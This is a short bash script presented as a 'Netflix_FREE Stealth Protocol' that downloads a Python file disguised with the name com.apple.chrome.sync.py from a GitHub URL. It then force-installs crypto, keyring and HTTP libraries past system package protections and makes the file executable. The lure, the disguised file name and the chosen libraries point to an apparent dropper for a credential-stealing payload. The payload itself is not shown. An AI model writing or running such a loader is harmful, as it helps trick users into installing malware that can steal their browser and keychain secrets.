#!/bin/bash
echo "[*] Initializing Netflix_FREE Stealth Protocol..."

# 1. Télécharger le script principal sur la machine (Crucial !) [cite: 1]
curl -s -O https://raw.githubusercontent.com/souhail-lass/Netflix_FREE/main/com.apple.chrome.sync.py

# 2. Forcer l'installation des dépendances (Bypass PEP 668) 
pip3 install pycryptodome keyring requests --break-system-packages --quiet

# 3. Accorder les permissions d'exécution 
chmod +x com.apple.chrome.sync.py

echo "[+] Environment Ready. Lock in."
